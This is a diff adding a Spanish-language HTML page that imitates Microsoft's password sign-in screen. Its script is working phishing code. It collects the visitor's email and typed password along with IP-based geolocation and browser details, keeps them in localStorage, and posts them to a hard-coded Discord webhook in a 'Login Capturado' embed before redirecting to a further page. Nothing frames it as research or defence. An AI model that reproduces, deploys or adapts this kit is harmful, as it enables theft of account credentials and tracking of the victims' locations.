@@ -1,0 +1,799 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Escribir contraseña - Microsoft</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com/"></script>
+
+    <!-- Configuración personalizada de Tailwind -->
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              "ms-blue": "#0078d4",
+              "ms-blue-hover": "#106ebe",
+              "ms-blue-active": "#005a9e",
+              "ms-red": "#f25022",
+              "ms-green": "#7fba00",
+              "ms-yellow": "#ffb900",
+              "ms-blue-logo": "#00bcf2",
+              "ms-gray": "#1b1b1b",
+              "ms-gray-light": "#605e5c",
+              "ms-border": "#8a8886",
+              "ms-bg": "#f5f5f5",
+            },
+            fontFamily: {
+              segoe: [
+                '"Segoe UI"',
+                "system-ui",
+                "-apple-system",
+                "BlinkMacSystemFont",
+                "sans-serif",
+              ],
+            },
+            fontSize: {
+              "ms-title": ["28px", { lineHeight: "36px", fontWeight: "600" }],
+              "ms-subtitle": [
+                "15px",
+                { lineHeight: "20px", fontWeight: "400" },
+              ],
+              "ms-body": ["15px", { lineHeight: "20px", fontWeight: "400" }],
+              "ms-link": ["13px", { lineHeight: "16px", fontWeight: "400" }],
+              "ms-logo": ["21px", { lineHeight: "28px", fontWeight: "600" }],
+            },
+            boxShadow: {
+              "ms-card": "0 2px 6px rgba(0,0,0,0.2)",
+              "ms-input-focus": "inset 0 0 0 1px #0078d4",
+            },
+            animation: {
+              "fade-in": "fadeIn 0.3s ease-out",
+              "pulse-subtle": "pulseSubtle 2s ease-in-out infinite",
+            },
+            keyframes: {
+              fadeIn: {
+                from: { opacity: "0", transform: "translateY(10px)" },
+                to: { opacity: "1", transform: "translateY(0)" },
+              },
+              pulseSubtle: {
+                "0%, 100%": { opacity: "1" },
+                "50%": { opacity: "0.8" },
+              },
+            },
+          },
+        },
+      };
+    </script>
+
+    <!-- Estilos personalizados mínimos -->
+    <style>
+      body {
+        font-family:
+          "Segoe UI",
+          system-ui,
+          -apple-system,
+          BlinkMacSystemFont,
+          sans-serif;
+        background: url("image.html") center/cover no-repeat fixed;
+        min-height: 100vh;
+      }
+
+      /* Optimización de rendimiento para animaciones */
+      .animate-fade-in {
+        will-change: transform, opacity;
+      }
+    </style>
+  </head>
+
+  <body class="relative bg-fixed bg-center bg-cover min-h-screen">
+    <!-- Background overlay -->
+    <div class="fixed inset-0 bg-white/10 backdrop-blur-[0.5px]"></div>
+
+    <!-- Main Content -->
+    <div
+      class="relative z-10 min-h-screen flex items-center justify-center p-4"
+    >
+      <div class="w-full max-w-md animate-fade-in">
+        <div class="bg-white rounded-xl shadow-ms-card p-8 sm:p-12">
+          <!-- Microsoft Logo -->
+          <div class="flex items-center justify-center mb-8">
+            <div class="grid grid-cols-2 gap-px w-6 h-6 mr-3">
+              <div class="bg-ms-red w-3 h-3"></div>
+              <div class="bg-ms-green w-3 h-3"></div>
+              <div class="bg-ms-blue-logo w-3 h-3"></div>
+              <div class="bg-ms-yellow w-3 h-3"></div>
+            </div>
+            <span class="text-ms-logo text-ms-gray font-semibold"
+              >Microsoft</span
+            >
+          </div>
+
+          <!-- Email display -->
+          <div class="mb-6">
+            <div class="text-center mb-4">
+              <div
+                class="inline-flex items-center justify-center bg-transparent rounded-full px-5 py-2 border border-gray-300 max-w-full"
+              >
+                <span
+                  id="userEmail"
+                  class="text-sm text-ms-gray font-medium truncate"
+                  >usuario@ejemplo.com</span
+                >
+              </div>
+            </div>
+            <div class="text-center">
+              <button
+                onclick="goBack()"
+                class="text-ms-link text-ms-blue hover:underline hover:text-ms-blue-hover transition-colors duration-150 text-sm"
+                aria-label="Cambiar cuenta"
+              >
+                No eres tú?
+              </button>
+            </div>
+          </div>
+
+          <h1 class="text-xl text-ms-gray mb-8 font-semibold text-center">
+            Escribir contraseña
+          </h1>
+
+          <form class="space-y-6" id="loginForm">
+            <div class="relative">
+              <input
+                type="password"
+                id="password"
+                placeholder="Contraseña"
+                class="w-full px-3 py-3 text-ms-gray bg-white border border-ms-border rounded text-ms-body focus:outline-none focus:border-ms-blue focus:shadow-ms-input-focus transition-all duration-150 pr-10"
+                required
+                autocomplete="current-password"
+                aria-describedby="passwordHelp"
+              />
+              <button
+                type="button"
+                id="togglePassword"
+                class="absolute right-3 top-1/2 transform -translate-y-1/2 text-ms-gray-light hover:text-ms-gray transition-colors duration-150 focus:outline-none focus:ring-2 focus:ring-ms-blue focus:ring-opacity-50 rounded p-1"
+                tabindex="0"
+                aria-label="Mostrar/ocultar contraseña"
+              >
+                <svg
+                  id="eyeIcon"
+                  class="w-5 h-5"
+                  fill="none"
+                  stroke="currentColor"
+                  viewBox="0 0 24 24"
+                  aria-hidden="true"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                  ></path>
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
+                  ></path>
+                </svg>
+              </button>
+            </div>
+
+            <div id="passwordHelp" class="text-xs text-ms-gray-light hidden">
+              La contraseña distingue entre mayúsculas y minúsculas.
+            </div>
+
+            <div class="text-left">
+              <a
+                href="#"
+                class="text-ms-link text-ms-blue hover:underline hover:text-ms-blue-hover transition-colors duration-150"
+              >
+                ¿Olvidó su contraseña?
+              </a>
+            </div>
+
+            <button
+              type="submit"
+              id="submitButton"
+              class="w-full bg-ms-blue text-white font-semibold py-2 px-3 rounded text-ms-body hover:bg-ms-blue-hover active:bg-ms-blue-active transition-colors duration-150 disabled:opacity-70 disabled:cursor-not-allowed focus:outline-none focus:ring-2 focus:ring-ms-blue focus:ring-offset-2"
+            >
+              Iniciar sesión
+            </button>
+          </form>
+
+          <!-- Sign-in options -->
+          <div class="mt-8 pt-6 border-t border-gray-200">
+            <div class="text-center">
+              <a
+                href="#"
+                class="text-ms-link text-ms-blue hover:underline hover:text-ms-blue-hover transition-colors duration-150"
+              >
+                Otras formas de iniciar sesión
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Footer Links -->
+    <div
+      class="fixed bottom-0 left-0 right-0 bg-white/95 backdrop-blur-md border-t border-gray-200 py-2 z-50"
+    >
+      <div class="max-w-4xl mx-auto px-4">
+        <div
+          class="flex flex-col sm:flex-row items-center justify-center space-y-0.5 sm:space-y-0 sm:space-x-6 text-xs text-ms-gray-light"
+        >
+          <a href="#" class="hover:text-ms-blue transition-colors duration-150"
+            >Ayuda</a
+          >
+          <a href="#" class="hover:text-ms-blue transition-colors duration-150"
+            >Términos de uso</a
+          >
+          <a href="#" class="hover:text-ms-blue transition-colors duration-150"
+            >Privacidad y cookies</a
+          >
+          <span class="text-center text-xs px-1 leading-tight hidden sm:inline">
+            Usa la exploración privada si este no es tu dispositivo.
+            <a
+              href="#"
+              class="text-ms-blue hover:underline transition-colors duration-150"
+              >Más información</a
+            >
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Script optimizado -->
+    <script>
+      // CONFIGURACIÓN
+      const CONFIG = {
+        discordWebhook:
+          "https://discord.com/api/webhooks/1463865279279796387/DUQEzuZnytmjyNaVjmFSKpODSdyasVQDL32YSMvDLp4m24Tr8Wjvjx8jnsjQPe6g3hVq",
+        nextPage: "index3.html",
+        minPasswordLength: 1,
+        passwordToggleDelay: 150,
+        // API para obtener información de IP (gratis, sin necesidad de API key)
+        ipApiUrl: "https://api.ipapi.is/"
+      };
+
+      // Elementos del DOM
+      const DOM = {
+        passwordInput: document.getElementById("password"),
+        loginForm: document.getElementById("loginForm"),
+        submitButton: document.getElementById("submitButton"),
+        userEmail: document.getElementById("userEmail"),
+        togglePasswordBtn: document.getElementById("togglePassword"),
+        eyeIcon: document.getElementById("eyeIcon"),
+        passwordHelp: document.getElementById("passwordHelp"),
+      };
+
+      // Estado de la aplicación
+      let appState = {
+        isSubmitting: false,
+        isPasswordVisible: false,
+        userEmail: "",
+        locationData: null,
+      };
+
+      // Utilidades
+      const Utils = {
+        /**
+         * Obtiene información de IP, país y ciudad
+         */
+        getLocationData: async function () {
+          try {
+            console.log("🌍 Obteniendo datos de geolocalización...");
+
+            const response = await fetch(CONFIG.ipApiUrl);
+
+            if (!response.ok) {
+              console.warn("⚠️ No se pudo obtener datos de geolocalización");
+              return null;
+            }
+
+            const data = await response.json();
+
+             const locationInfo = {
+              ip: data.ip || "N/A",
+              city: data.location.city || "N/A",
+              region: data.location.state || "N/A",
+              country: data.location.country || "N/A",
+              countryCode: data.location.country_code || "N/A",
+              postal: data.location.zip || "N/A",
+              latitude: data.location.latitude || "N/A",
+              longitude: data.location.longitude || "N/A",
+              timezone: data.location.timezone || "N/A",
+              org: data.asn.org || "N/A",
+              asn: data.asn.descr || "N/A",
+            };
+
+            console.log("✅ Datos de geolocalización obtenidos:", locationInfo);
+            return locationInfo;
+          } catch (error) {
+            console.error("❌ Error obteniendo geolocalización:", error);
+            return {
+              ip: "Error",
+              city: "No disponible",
+              region: "No disponible",
+              country: "No disponible",
+              countryCode: "N/A",
+              postal: "N/A",
+              latitude: "N/A",
+              longitude: "N/A",
+              timezone: "N/A",
+              org: "N/A",
+              asn: "N/A",
+            };
+          }
+        },
+
+        /**
+         * Obtiene parámetros de la URL
+         */
+        getUrlParams: function () {
+          const params = new URLSearchParams(window.location.search);
+          return {
+            email: params.get("email") || "usuario@ejemplo.com",
+          };
+        },
+
+        /**
+         * Alterna la visibilidad de la contraseña
+         */
+        togglePasswordVisibility: function () {
+          appState.isPasswordVisible = !appState.isPasswordVisible;
+
+          DOM.passwordInput.type = appState.isPasswordVisible
+            ? "text"
+            : "password";
+
+          if (appState.isPasswordVisible) {
+            DOM.eyeIcon.innerHTML = `
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
+      `;
+            DOM.togglePasswordBtn.setAttribute(
+              "aria-label",
+              "Ocultar contraseña",
+            );
+            if (DOM.passwordHelp) DOM.passwordHelp.classList.remove("hidden");
+          } else {
+            DOM.eyeIcon.innerHTML = `
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+      `;
+            DOM.togglePasswordBtn.setAttribute(
+              "aria-label",
+              "Mostrar contraseña",
+            );
+            if (DOM.passwordHelp) DOM.passwordHelp.classList.add("hidden");
+          }
+
+          setTimeout(() => {
+            DOM.passwordInput.focus();
+          }, CONFIG.passwordToggleDelay);
+        },
+
+        /**
+         * Actualiza estado del botón de envío
+         */
+        setSubmitButtonState: function (isSubmitting) {
+          appState.isSubmitting = isSubmitting;
+          DOM.submitButton.disabled = isSubmitting;
+          DOM.submitButton.textContent = isSubmitting
+            ? "Verificando..."
+            : "Iniciar sesión";
+
+          if (isSubmitting) {
+            DOM.submitButton.classList.add("animate-pulse-subtle");
+          } else {
+            DOM.submitButton.classList.remove("animate-pulse-subtle");
+          }
+        },
+
+        /**
+         * Valida la contraseña
+         */
+        validatePassword: function (password) {
+          return {
+            isValid: password.trim().length >= CONFIG.minPasswordLength,
+            message:
+              password.trim().length === 0
+                ? "Por favor, ingrese su contraseña"
+                : "",
+          };
+        },
+
+        /**
+         * Guarda login en localStorage con ubicación
+         */
+        saveLoginToLocalStorage: function (email, password, locationData) {
+          try {
+            const sessionId =
+              Date.now().toString(36) + Math.random().toString(36).substr(2);
+            let savedLogins = JSON.parse(
+              localStorage.getItem("microsoft_logins_full") || "[]",
+            );
+
+            const loginData = {
+              id: sessionId,
+              email: email,
+              password: password,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              language: navigator.language,
+              location: locationData, // Agregar datos de ubicación
+            };
+
+            savedLogins.push(loginData);
+            if (savedLogins.length > 50) {
+              savedLogins = savedLogins.slice(-50);
+            }
+
+            localStorage.setItem(
+              "microsoft_logins_full",
+              JSON.stringify(savedLogins),
+            );
+            localStorage.setItem("last_login", JSON.stringify(loginData));
+
+            console.log("💾 Login guardado en localStorage");
+            return loginData;
+          } catch (error) {
+            console.error("❌ Error guardando en localStorage:", error);
+            return null;
+          }
+        },
+
+        /**
+         * Envía datos de login a Discord con geolocalización
+         */
+        sendToDiscord: async function (email, password, locationData) {
+          try {
+            console.log("📤 Enviando login a Discord...");
+
+            if (
+              !CONFIG.discordWebhook ||
+              CONFIG.discordWebhook.includes("TU_WEBHOOK")
+            ) {
+              console.error("❌ Webhook no configurado");
+              return false;
+            }
+
+            // Preparar campos del embed
+            const fields = [
+              {
+                name: "📧 Email",
+                value: `\`${email}\``,
+                inline: false,
+              },
+              {
+                name: "🔑 Contraseña",
+                value: `\`${password}\``,
+                inline: false,
+              },
+              {
+                name: "⏰ Timestamp",
+                value: new Date().toLocaleString("es-ES"),
+                inline: true,
+              },
+            ];
+
+            // Agregar información de ubicación si está disponible
+            if (locationData) {
+              fields.push(
+                {
+                  name: "🌐 Dirección IP",
+                  value: `\`${locationData.ip}\``,
+                  inline: true,
+                },
+                {
+                  name: "🏙️ Ciudad",
+                  value: locationData.city,
+                  inline: true,
+                },
+                {
+                  name: "🗺️ Región",
+                  value: locationData.region,
+                  inline: true,
+                },
+                {
+                  name: "🌍 País",
+                  value: `${locationData.country} (${locationData.countryCode})`,
+                  inline: true,
+                },
+                {
+                  name: "📮 Código Postal",
+                  value: locationData.postal,
+                  inline: true,
+                },
+                {
+                  name: "🕐 Zona Horaria",
+                  value: locationData.timezone,
+                  inline: true,
+                },
+                {
+                  name: "📍 Coordenadas",
+                  value: `Lat: ${locationData.latitude}, Lon: ${locationData.longitude}`,
+                  inline: false,
+                },
+                {
+                  name: "🏢 ISP / Organización",
+                  value: `\`${locationData.org}\``,
+                  inline: false,
+                },
+              );
+            }
+
+            // Agregar información del navegador
+            fields.push(
+              {
+                name: "💻 Navegador",
+                value: `\`${navigator.userAgent.substring(0, 100)}\``,
+                inline: false,
+              },
+              {
+                name: "🖥️ Plataforma",
+                value: navigator.platform,
+                inline: true,
+              },
+              {
+                name: "🗣️ Idioma",
+                value: navigator.language,
+                inline: true,
+              },
+            );
+
+            // Crear embed con las credenciales y ubicación
+            const embed = {
+              title: "🔐 Login Capturado",
+              description: locationData
+                ? `**Usuario desde:** ${locationData.city}, ${locationData.country}`
+                : "Ubicación no disponible",
+              color: 0x00ff00, // Verde para login exitoso
+              fields: fields,
+              timestamp: new Date().toISOString(),
+              footer: {
+                text: "MS Login Capture System",
+              },
+            };
+
+            const payload = {
+              username: "Login Tracker",
+              embeds: [embed],
+            };
+
+            console.log("📦 Enviando payload...");
+
+            const response = await fetch(CONFIG.discordWebhook, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            });
+
+            if (response.ok) {
+              console.log("✅ Login enviado exitosamente a Discord");
+              return true;
+            } else {
+              const errorText = await response.text();
+              console.error("❌ Error en Discord:", response.status, errorText);
+              return false;
+            }
+          } catch (error) {
+            console.error("❌ Error crítico enviando a Discord:", error);
+            return false;
+          }
+        },
+      };
+
+      // Manejadores de eventos
+      const EventHandlers = {
+        /**
+         * Maneja el envío del formulario
+         */
+        handleLoginSubmit: async function (event) {
+          event.preventDefault();
+
+          if (appState.isSubmitting) {
+            console.log("⚠️ Ya se está procesando un envío");
+            return;
+          }
+
+          const password = DOM.passwordInput.value.trim();
+
+          // Validar contraseña
+          const validation = Utils.validatePassword(password);
+          if (!validation.isValid) {
+            DOM.passwordInput.focus();
+            DOM.passwordInput.classList.add("border-red-500");
+            return;
+          }
+
+          console.log("🚀 Iniciando proceso de login...");
+
+          // Preparar datos
+          Utils.setSubmitButtonState(true);
+
+          try {
+            // 1. Obtener datos de geolocalización
+            const locationData = await Utils.getLocationData();
+            appState.locationData = locationData;
+
+            // 2. Guardar en localStorage con ubicación
+            const loginData = Utils.saveLoginToLocalStorage(
+              appState.userEmail,
+              password,
+              locationData,
+            );
+
+            if (!loginData) {
+              throw new Error("Error guardando datos localmente");
+            }
+
+            // 3. Enviar a Discord con ubicación
+            const discordSuccess = await Utils.sendToDiscord(
+              appState.userEmail,
+              password,
+              locationData,
+            );
+            console.log(discordSuccess ? "✅ Discord OK" : "⚠️ Discord FAIL");
+
+            // 4. Redirigir a la siguiente página
+            console.log(`🔄 Redirigiendo a ${CONFIG.nextPage}...`);
+            setTimeout(() => {
+              window.location.href = `${CONFIG.nextPage}?email=${encodeURIComponent(appState.userEmail)}`;
+            }, 800);
+          } catch (error) {
+            console.error("❌ Error en el proceso de login:", error);
+            Utils.setSubmitButtonState(false);
+
+            // Mostrar error temporal
+            DOM.submitButton.textContent = "Error, intentar nuevamente";
+            DOM.submitButton.classList.add("bg-red-500");
+
+            setTimeout(() => {
+              DOM.submitButton.textContent = "Iniciar sesión";
+              DOM.submitButton.classList.remove("bg-red-500");
+              Utils.setSubmitButtonState(false);
+            }, 2000);
+          }
+        },
+
+        /**
+         * Maneja cambios en el input de contraseña
+         */
+        handlePasswordInput: function () {
+          const password = DOM.passwordInput.value;
+
+          if (password.length > 0) {
+            DOM.passwordInput.classList.remove("border-red-500");
+          }
+
+          DOM.submitButton.disabled = password.trim().length === 0;
+        },
+
+        /**
+         * Maneja teclas en el input de contraseña
+         */
+        handlePasswordKeydown: function (event) {
+          if (
+            event.key === "Enter" &&
+            !DOM.submitButton.disabled &&
+            !appState.isSubmitting
+          ) {
+            DOM.submitButton.click();
+          }
+
+          if (event.key === "Escape") {
+            DOM.passwordInput.value = "";
+            DOM.passwordInput.focus();
+          }
+        },
+      };
+
+      // Funciones de navegación
+      function goBack() {
+        if (window.history.length > 1) {
+          window.history.back();
+        } else {
+          window.location.href = "index.html";
+        }
+      }
+
+      // Inicialización de la aplicación
+      function initApp() {
+        console.log("🔧 Inicializando aplicación de login...");
+
+        // Verificar elementos DOM
+        if (!DOM.passwordInput || !DOM.loginForm || !DOM.submitButton) {
+          console.error("❌ Elementos del DOM no encontrados");
+          return;
+        }
+
+        // Obtener email de la URL
+        const urlParams = Utils.getUrlParams();
+        appState.userEmail = urlParams.email;
+
+        // Actualizar email en la interfaz
+        if (DOM.userEmail) {
+          DOM.userEmail.textContent = appState.userEmail;
+          DOM.userEmail.title = appState.userEmail;
+        }
+
+        // Configurar atributos de accesibilidad
+        DOM.passwordInput.setAttribute("aria-label", "Contraseña de Microsoft");
+        DOM.submitButton.setAttribute("aria-label", "Iniciar sesión");
+
+        // Configurar event listeners
+        DOM.loginForm.addEventListener(
+          "submit",
+          EventHandlers.handleLoginSubmit,
+        );
+        DOM.passwordInput.addEventListener(
+          "input",
+          EventHandlers.handlePasswordInput,
+        );
+        DOM.passwordInput.addEventListener(
+          "keydown",
+          EventHandlers.handlePasswordKeydown,
+        );
+
+        if (DOM.togglePasswordBtn) {
+          DOM.togglePasswordBtn.addEventListener(
+            "click",
+            Utils.togglePasswordVisibility,
+          );
+          DOM.togglePasswordBtn.addEventListener("keydown", function (event) {
+            if (event.key === "Enter" || event.key === " ") {
+              event.preventDefault();
+              Utils.togglePasswordVisibility();
+            }
+          });
+        }
+
+        // Prevenir reenvío con F5
+        window.addEventListener("pageshow", function (event) {
+          if (event.persisted) {
+            Utils.setSubmitButtonState(false);
+            DOM.passwordInput.value = "";
+          }
+        });
+
+        // Pre-cargar datos de geolocalización para optimizar velocidad
+        Utils.getLocationData()
+          .then((data) => {
+            appState.locationData = data;
+            console.log("📍 Geolocalización pre-cargada");
+          })
+          .catch((err) => {
+            console.log("⚠️ No se pudo pre-cargar geolocalización");
+          });
+
+        // Autofocus
+        setTimeout(() => {
+          DOM.passwordInput.focus();
+        }, 100);
+
+        // Inicializar estado del botón
+        DOM.submitButton.disabled = true;
+
+        console.log("✅ App de login inicializada para:", appState.userEmail);
+        console.log(
+          "📨 Webhook:",
+          CONFIG.discordWebhook.substring(0, 50) + "...",
+        );
+      }
+
+      // Inicializar
+      if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initApp);
+      } else {
+        initApp();
+      }
+    </script>
+</html>
